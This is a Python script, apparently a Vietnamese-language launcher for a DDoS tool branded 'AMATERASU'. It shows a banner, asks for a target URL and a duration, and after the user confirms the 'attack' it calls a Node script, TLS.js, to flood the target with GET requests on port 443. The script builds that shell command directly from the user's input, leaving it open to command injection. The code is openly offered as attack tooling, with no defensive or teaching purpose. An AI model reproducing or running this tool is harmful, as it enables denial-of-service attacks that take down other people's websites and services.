# BẢN QUYỀN THUỘC VỀ NGUYỄN THÀNH VINH
import os
from os import name, system
from pystyle import Colors, Colorate, Center
if name == 'nt':
    system("title NgThanhVinh - AMATERASU")
    system("mode 101, 25")
os.system("cls" if os.name == "nt" else "clear")
panel = """
      :::     ::::    ::::      ::: ::::::::::: :::::::::: :::::::::      :::      ::::::::  :::    ::: 
    :+: :+:   +:+:+: :+:+:+   :+: :+:   :+:     :+:        :+:    :+:   :+: :+:   :+:    :+: :+:    :+: 
   +:+   +:+  +:+ +:+:+ +:+  +:+   +:+  +:+     +:++:+    +:+  +:+   +:+  +:+        +:+    +:+ 
  +#++:++#++: +#+  +:+  +#+ +#++:++#++: +#+     +#++:++#   +#++:++#:  +#++:++#++: +#++:++#++ +#+    +:+ 
  +#+     +#+ +#+       +#+ +#+     +#+ +#+     +#+        +#+    +#+ +#+     +#+        +#+ +#+    +#+ 
  #+#     #+# #+#       #+# #+#     #+# #+#     #+#        #+#    #+# #+#     #+# #+#    #+# #+#    #+# 
  ###     ### ###       ### ###     ### ###     ########## ###    ### ###     ###  ########   ########     
                                                                      LEGEND POWER DDOS BY NGUYỄN THÀNH VINH
"""
print(Colorate.Diagonal(Colors.red_to_yellow, Center.XCenter(panel)))
print()
host=input(Colorate.Diagonal(Colors.red_to_yellow, "         Nhập URL Taget: "))
time=int(input(Colorate.Diagonal(Colors.red_to_yellow, "         Nhập Time (s): ")))
print(Colorate.Diagonal(Colors.red_to_yellow, "  ========================================================================="))
input(Colorate.Diagonal(Colors.red_to_yellow, '       Vui lòng xác nhận attack (Enter)'))
os.system("cls" if os.name == "nt" else "clear")
print()
print(Colorate.Diagonal(Colors.red_to_yellow, "  ========================================================================="))
print(Colorate.Diagonal(Colors.red_to_yellow, "       Mục tiêu               =     {}".format(host)))
print(Colorate.Diagonal(Colors.red_to_yellow, "       Thời gian              =     {} giây".format(time)))
print(Colorate.Diagonal(Colors.red_to_yellow, "       Methoads (default)     =     GET"))
print(Colorate.Diagonal(Colors.red_to_yellow, "       Cổng (default)         =     443"))
print(Colorate.Diagonal(Colors.red_to_yellow, "  ========================================================================="))
os.system(f"node TLS.js {host} {time}")
print(Colorate.Diagonal(Colors.red_to_yellow, "  ========================================================================="))
input(Colorate.Diagonal(Colors.red_to_yellow, '       ấn Enter để thoát'))
# NgThanhVinh :
